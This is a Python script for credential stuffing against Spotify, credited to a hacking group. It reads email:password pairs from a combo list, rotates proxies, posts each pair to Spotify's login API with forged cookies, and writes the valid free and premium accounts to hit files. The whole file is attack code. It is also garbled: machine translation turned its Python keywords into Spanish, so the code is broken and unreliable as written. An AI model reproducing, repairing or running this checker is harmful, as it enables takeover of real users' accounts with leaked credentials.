 import requests

 req = requests.session()



banner = "" "__ ____ __
  / / ___ _ __ / / / __ _ _________ _ / / _
 / _ \ / _ \ | / | / / / / _ \ | / | / / __ / _ `/ __ /
/ _ // _ / \ ___ / __, __ / _ / _ / \ ___ / __, __ / \ __ / \ _, _ / \ __ / "" "


a . sistema ( "cls" )
clase  good_or_bad ( objeto ):
	def  tellmewhatis ( auto , correo electrónico , contraseña , caso ):
		si  caso  ==  "gratis" :
			
			print ( Fore . BLUE  +  Back . GREEN +  f "[+] CUENTA VALIDA: { email } : { password } " )
			imprimir ( f "" "SPOTIFICAR CUENTAS
e = { correo electrónico }
p = { contraseña }		
CHEQUEADOR DE PANDORA BOX HACKING GROUP
HOLLOWCAT
"" " , archivo = abierto ( " Spotify_HITSFREE.txt " , " a " ))
			
		si  caso  ==  verdadero :
			
			print ( Fore . BLUE  +  Back . GREEN +  f "[+] CUENTA VALIDA: { email } : { password } " )
			imprimir ( f "" "SPOTIFICAR CUENTAS
e = { correo electrónico }
p = { contraseña }		
CHEQUEADOR DE PANDORA BOX HACKING GROUP
HOLLOWCAT
"" " , archivo = abierto ( " Spotify_HITSPREMIUN.txt " , " a " ))
			
		elif  caso  ==  Falso :
			
			imprimir ( Fore . ROJO  +  Volver . AMARILLO +  f "[-] CUENTA invalida: { email } : { contraseña } " )
			print ( f "" " { email } : { contraseña } " "" , archivo = abierto ( "bad.txt" , "a" ))
			

 mensaje de clase ( objeto ):
	 proxies def ( auto ):
		prueba :
			archivo  =  abierto ( "proxy_lives.txt" ). readlines ()
			file_lines  = [ proxies . rstrip () para  proxies  en el  archivo ]
			resultado  = { "https" : "http: //" + opción ( file_lines )}
			 resultado devuelto
		excepto :
			imprimir ( "PROXY ERROR" )
	 solicitud de definición ( auto , correo electrónico , contraseña ):
		prueba :
			asd  =  abierto ( "Spotify_HITSFREE.txt" , "r +" )
			asds  =  asd . leer ()
			abc  =  abierto ( "Spotify_HITSPREMIUN.txt" , "r +" )
			abcs  =  abc . leer ()
			bad  =  open ( "bad.txt" , "r +" )
			males  =  mala . leer ()
			req  =  solicitudes . sesión ()
			stop  =  "default@gmail.com"
		excepto :
			imprimir ( "ERROR ABRIENDO ARCHIVOS" )
		
		
		Si   correo electrónico  en  males :
			os . sistema ( "^ Z" )
			os . sistema ( "^ C" )
			salida ()
		si   correo electrónico  en  asds :
			os . sistema ( "^ Z" )
			os . sistema ( "^ C" )
			salida ()
		si   correo electrónico  en  abcs :
			os . sistema ( "^ Z" )
			os . sistema ( "^ C" )
			salida ()
		
		más :
			req  =  solicitudes . Sesión ()
			proxy  =  self . proxies ()
			
			
			prueba :
				mientras  cierto :
					a  =  req . get ( "https://accounts.spotify.com" )
					csrf_token  =  a . galletas . get ( "csrf_token" )
					
					
					si  a . status_code  ==  200 :
						descanso
			excepto :
				pasar
			prueba :
				cookies  = { "fb_continue" : "https% 3A% 2F% 2Fwww.spotify.com% 2Fid% 2Faccount% 2Foverview% 2F" , "sp_landing" : "play.spotify.com% 2F" , "sp_landingref" : "https% 3A% 2F% 2Fwww.google.com% 2F " , " user_eligible " : " 0 " , " spot " : "% 7B% 22t% 22% 3A1498061345% 2C% 22m% 22% 3A% 22id% 22% 2C% 22p % 22% 3Anull% 7D " , " sp_t " : " ac1439ee6195be76711e73dc0f79f89 " , " sp_new " : " 1 " , "csrf_token " : csrf_token , " __bon " :"MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE =" , "recordar" : "false@false.com" , "_ga" : "GA1.2.153026989.1498061376" , "_gid" : "GA1.2.740264023 } 4980
				headers  = { "User-Agent" : "Mozilla / 5.0 (iPhone; CPU iPhone OS 8_3 como Mac OS X) AppleWebKit / 600.1.4 (KHTML, como Gecko) FxiOS / 1.0 Mobile / 12F69 Safari / 600.1.4" , " Acepte " : " application / json, text / plain " , " Content-Type " : " application / x-www-form-urlencoded " }
				param  = { "recordar" : "falso" , "nombre de usuario" : correo electrónico , "contraseña" : contraseña , "csrf_token" : csrf_token }       
				
				
				prueba :
					
					fuente  =  req . post ( "https://accounts.spotify.com/api/login" , data = param , cookies = cookies )	
					nuebo  =  req . publicación ( "https://www.spotify.com/do/account/overview/" , cookies = cookies )
					soup2  =  BeautifulSoup ( nuebo . texto , "html" )
					captura  =  sopa2 . find ( "h3" , { "class" : "nombre-producto" })
				excepto :
					
					pasar
			excepto :
					pasar
			
			prueba :
				if  "" "{" error ":" errorInvalidCredentials "}" ""  en la  fuente . texto :
					good_or_bad (). tellmewhatis ( correo electrónico , contraseña , caso = False )
				elif  "Gratis"  en  captura :
					good_or_bad (). tellmewhatis ( correo electrónico , contraseña , caso = "gratis" )

				más :
					good_or_bad (). tellmewhatis ( correo electrónico , contraseña , caso = True )

    				
			excepto  Excepción  como  e :
				pasar
			prueba :
				Si  de correo electrónico  en la  parada :
					dormir ( 5 )
					imprimir ( "TODAS LAS CUETNAS HAN SIDO PROBADAS" )
					pasar
			excepto :
				pasar					

		

clase  x ( objeto ):
		
	def  carga ( auto , b ):
		archivo  =  abierto ( "combo.txt" , "r" )
		prueba :
				
			file_lines  =  archivo . líneas de lectura () [ b ]
			combo  =  file_lines . rstrip ()
			combos  =  combo . dividir ( ":" )
			auto . cheque ( combos )
		excepto :
			pasar


	 verificación de def ( auto , acc ):
		
		prueba :
			correo electrónico  =  acc [ 0 ]
			contraseña  =  acc [ 1 ]
			
		#print (self.load ())
		excepto :
			pasar
		mientras  cierto :
			prueba :
				
				post (). solicitud ( correo electrónico , contraseña )
				
				
				
			excepto   Excepción :
				
				descanso
	def  main ( self ):
		imprimir ( "" "++++++++++++++++++++ CONFIGURAR POR: ++++++++++++++++++" "" )
		imprimir ( delante . VERDE + Atrás . NEGRO + banner )
		a  =  abierto ( "combo.txt" , "r" )
		s  =  len ( a . readlines ())
		para  b  en  rango ( s ):
			w  =  roscado . Hilo ( objetivo = auto . Carga ( b ))
			w . inicio ()
		
if  __name__  ==  '__main__' :
	x (). main ()